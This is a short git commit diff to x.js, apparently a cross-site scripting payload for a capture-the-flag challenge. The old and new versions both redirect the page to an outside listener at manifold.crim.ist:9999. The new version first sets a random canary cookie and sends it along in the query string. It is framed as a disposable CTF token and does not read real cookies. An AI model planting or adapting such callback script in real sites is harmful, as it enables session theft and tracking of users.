e9e5ef53e61c257939ecdd9843a86352c4bb2145
crimist <git@crim.ist>
2026-08-13 14:17:38 -0400

    Send disposable CTF canary

--- x.js
+++ x.js
@@ -1,1 +1,6 @@
-location.href = "http://manifold.crim.ist:9999/?xss=executed";
+const canary = crypto.randomUUID();
+document.cookie = `ctf_canary=${encodeURIComponent(canary)}; Path=/; SameSite=Lax`;
+
+const callback = new URL("http://manifold.crim.ist:9999/");
+callback.searchParams.set("ctf_canary", canary);
+location.href = callback;
